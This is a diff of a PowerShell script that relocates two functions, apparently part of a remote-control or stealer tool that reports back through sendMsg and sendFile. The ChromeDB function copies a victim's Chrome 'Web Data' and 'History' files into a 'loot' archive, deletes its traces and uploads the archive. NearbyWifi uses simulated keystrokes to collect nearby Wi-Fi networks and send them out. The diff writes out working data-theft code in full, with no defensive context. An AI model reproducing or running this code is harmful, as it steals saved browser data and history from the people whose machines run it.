@@ -213,52 +213,6 @@ param ([string]$Prefix)
     rm -Path $FileOut
 }
 
-Function NearbyWifi {
-    $showNetworks = explorer.exe ms-availablenetworks:
-    sleep 4
-    $wshell = New-Object -ComObject wscript.shell
-    $wshell.AppActivate('explorer.exe')
-    $tab = 0
-    while ($tab -lt 6){
-        $wshell.SendKeys('{TAB}')
-        sleep -m 100
-        $tab++
-    }
-    $wshell.SendKeys('{ENTER}')
-    sleep -m 200
-    $wshell.SendKeys('{TAB}')
-    sleep -m 200
-    $wshell.SendKeys('{ESC}')
-    $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
-    $Wifi = ($NearbyWifi|Out-String)
-    sendMsg -Message "``````$Wifi``````"
-}
-
-Function ChromeDB {
-    $sourceDir = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
-    $tempFolder = [System.IO.Path]::GetTempPath() + "loot"
-    if (!(Test-Path $tempFolder)){
-        New-Item -Path $tempFolder -ItemType Directory -Force
-    }
-    $filesToCopy = Get-ChildItem -Path $sourceDir -Filter '*' -Recurse | Where-Object { $_.Name -like 'Web Data' -or $_.Name -like 'History' }
-    foreach ($file in $filesToCopy) {
-        $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
-        $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension
-        $destination = Join-Path -Path $tempFolder -ChildPath $newFileName
-        Copy-Item -Path $file.FullName -Destination $destination -Force
-    }
-    $zipFileName = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "loot.zip")
-    Compress-Archive -Path $tempFolder -DestinationPath $zipFileName
-    $tempFolders = Get-ChildItem -Path $tempFolder -Directory
-    foreach ($folder in $tempFolders) {
-        if ($folder.Name -ne "loot") {
-            Remove-Item -Path $folder.FullName -Recurse -Force
-        }
-    }
-    Remove-Item -Path $tempFolder -Recurse -Force
-    sendFile -sendfilePath $zipFileName
-}
-
 Function SystemInfo{
 sendMsg -Message ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:"
 Add-Type -AssemblyName System.Windows.Forms
@@ -563,6 +517,52 @@ sendMsg -Message $infomessage1
 sendFile -sendfilePath $outpath
 Sleep 1
 Remove-Item -Path $outpath -force
+}
+
+Function NearbyWifi {
+    $showNetworks = explorer.exe ms-availablenetworks:
+    sleep 4
+    $wshell = New-Object -ComObject wscript.shell
+    $wshell.AppActivate('explorer.exe')
+    $tab = 0
+    while ($tab -lt 6){
+        $wshell.SendKeys('{TAB}')
+        sleep -m 100
+        $tab++
+    }
+    $wshell.SendKeys('{ENTER}')
+    sleep -m 200
+    $wshell.SendKeys('{TAB}')
+    sleep -m 200
+    $wshell.SendKeys('{ESC}')
+    $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
+    $Wifi = ($NearbyWifi|Out-String)
+    sendMsg -Message "``````$Wifi``````"
+}
+
+Function ChromeDB {
+    $sourceDir = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
+    $tempFolder = [System.IO.Path]::GetTempPath() + "loot"
+    if (!(Test-Path $tempFolder)){
+        New-Item -Path $tempFolder -ItemType Directory -Force
+    }
+    $filesToCopy = Get-ChildItem -Path $sourceDir -Filter '*' -Recurse | Where-Object { $_.Name -like 'Web Data' -or $_.Name -like 'History' }
+    foreach ($file in $filesToCopy) {
+        $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
+        $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension
+        $destination = Join-Path -Path $tempFolder -ChildPath $newFileName
+        Copy-Item -Path $file.FullName -Destination $destination -Force
+    }
+    $zipFileName = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "loot.zip")
+    Compress-Archive -Path $tempFolder -DestinationPath $zipFileName
+    $tempFolders = Get-ChildItem -Path $tempFolder -Directory
+    foreach ($folder in $tempFolders) {
+        if ($folder.Name -ne "loot") {
+            Remove-Item -Path $folder.FullName -Recurse -Force
+        }
+    }
+    Remove-Item -Path $tempFolder -Recurse -Force
+    sendFile -sendfilePath $zipFileName
 }
 
 # --------------------------------------------------------------- PRANK FUNCTIONS ------------------------------------------------------------------------
